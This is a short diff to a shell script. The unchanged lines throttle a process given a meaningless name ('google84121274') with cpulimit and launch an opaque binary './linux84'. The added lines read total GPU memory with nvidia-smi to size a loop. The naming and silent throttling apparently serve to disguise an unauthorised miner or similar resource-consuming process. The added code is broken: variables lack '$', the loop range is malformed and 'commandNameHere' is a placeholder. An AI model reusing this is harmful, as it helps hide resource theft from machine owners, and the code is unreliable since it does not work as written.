@@ -73,6 +73,19 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
+linux84741274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+count=$(echo "$linux84741274 - 1884"|bc)
+googlelinux84=$(echo "$count / 16384"|bc -l)
+linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
+googlelinux8474=${linuxgoogle84%.*}
+
+count8474=$(echo "googlelinux8474 * 2"|bc)
+
+linux8474=$(echo "$linux84741274 / count8474"|bc)
+
+for i in {1..$linux8474)}; do commandNameHere; done
+
 ./linux84
 
 else
